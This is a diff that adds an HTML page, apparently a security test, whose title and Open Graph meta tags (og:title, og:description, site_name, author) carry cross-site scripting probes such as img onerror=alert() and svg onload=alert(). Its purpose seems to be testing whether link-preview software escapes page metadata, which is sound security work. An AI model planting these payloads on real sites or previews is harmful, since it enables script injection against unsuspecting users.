@@ -1,0 +1,10 @@
+<!DOCTYPE html><html><head>
+<title>xss-og-title"><img src=x onerror=alert(1)></title>
+<meta property="og:title" content='og-pwn"><img src=x onerror=alert(2)>'/>
+<meta property="og:description" content="desc <svg onload=alert(3)>"/>
+<meta property="og:image" content="https://vta-itsec.github.io/cat.jpg"/>
+<meta property="og:url" content="https://vta-itsec.github.io/og.html"/>
+<meta property="og:type" content="article"/>
+<meta property="og:site_name" content="vtaitsec<img>"/>
+<meta property="article:author" content="auth<script>"/>
+</head><body>og test</body></html>
